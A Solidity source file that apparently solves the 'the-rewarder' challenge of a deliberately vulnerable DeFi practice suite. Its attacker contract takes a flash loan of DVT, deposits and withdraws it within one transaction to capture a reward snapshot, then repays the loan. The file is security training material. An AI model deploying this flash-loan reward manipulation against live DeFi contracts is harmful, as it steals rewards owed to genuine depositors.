// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";

interface IReceiver {
    function receiveFlashLoan(uint256 amount) external;
}

contract TheRewarderAttacker is IReceiver{
    FlashLoanerPool public lendingPool;
    TheRewarderPool public theRewarderPool;
    IERC20 public dvtToken;

    constructor(address poolAddress, address rewardPoolAddress, address tokenAddress) payable {
        lendingPool = FlashLoanerPool(poolAddress);
        theRewarderPool = TheRewarderPool(rewardPoolAddress);
        dvtToken = IERC20(tokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external{
        //get reward tokens
        dvtToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        //return dvt
        dvtToken.transfer(address(lendingPool), amount);
    }

    function attack(uint256 amount) external {
        lendingPool.flashLoan(amount);
    }
}
